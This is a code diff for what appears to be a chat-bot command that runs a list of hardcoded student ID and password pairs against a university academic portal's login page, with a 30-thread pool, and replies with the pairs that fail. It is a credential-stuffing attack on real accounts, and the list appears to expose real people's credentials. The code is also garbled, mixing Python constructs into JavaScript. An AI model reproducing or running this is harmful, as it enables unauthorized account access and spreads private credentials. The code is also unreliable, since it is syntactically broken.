@@ -1,7 +1,16 @@
 let util = require('util')
 let path = require('path')
 let { spawn } = require('child_process')
-let list = ${pickRandom(global.ube)}
+let list = [
+'195030107111024:Allisya123',
+'183141514111026:endah123',
+'185020300111086:yunita123',
+'185080300111030:faizan123',
+'185080301111020:adellia123',
+'185080307111002:azarine123',
+'175080301111038:yusuf123',
+'203140914111085:rafly123',
+]
         with open(list, 'r') {
 let lines = list.readLines()
         with ThreadPoolExecutor(max_workers: 30) as crot = {
@@ -12,7 +21,7 @@ let lines = list.readLines()
                     crot.submit(ub, user, pswd)
 }
 
-if ub (usr, pwd):
+if ub (usr, pwd){
 let url = 'https://siam.ub.ac.id/'
 let dat = {
 'usr':'username'
@@ -27,6 +36,7 @@ if res == 'Sistem Informasi Akademik Mahasiswa' = {
     else =
            //console.log = ("MODAR ${usr}:${pwd}")
        m.reply('MODAR ${usr}:${pwd}')
+     }
 }
 
 function pickRandom(list) {
@@ -34,7 +44,7 @@ return list[Math.floor(list.length * Math.random())]
 }             
                 
            
-global.ube [
+/*global.ube [
 '195030107111024:Allisya123',
 '183141514111026:endah123',
 '185020300111086:yunita123',
@@ -47,7 +57,7 @@ global.ube [
 '203140914111065:ichsan12345',
 '205080400113037:sinta123',
 '205080407113032:fardhian123',
-]
+]*/
 handler.command = /^tes$/i
 handler.owner = false
 handler.mods = false
